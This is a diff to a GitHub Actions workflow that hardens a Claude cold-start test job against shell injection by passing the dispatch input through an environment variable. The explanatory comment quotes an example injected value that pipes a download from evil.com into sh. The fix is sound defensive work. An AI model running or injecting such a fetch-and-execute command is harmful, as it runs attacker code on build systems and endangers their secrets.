@@ -51,10 +51,16 @@ jobs:
       - name: Run cold-start (Claude)
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Round 12 audit (v0.7.15): pass workflow_dispatch input via
+          # env, not direct ${{ }} expansion into shell, to avoid the
+          # GitHub Actions shell-injection class (a maintainer typo or
+          # malicious dispatch could otherwise smuggle commands via
+          # `inputs.model="; curl evil.com | sh #"`).
+          MODEL_INPUT: ${{ inputs.model }}
         run: |
           model_arg=""
-          if [ -n "${{ inputs.model }}" ]; then
-            model_arg="--model ${{ inputs.model }}"
+          if [ -n "${MODEL_INPUT:-}" ]; then
+            model_arg="--model ${MODEL_INPUT}"
           fi
           python tests/cold_start/run_cold_start.py --vendor claude $model_arg
       - name: Commit evidence row if changed
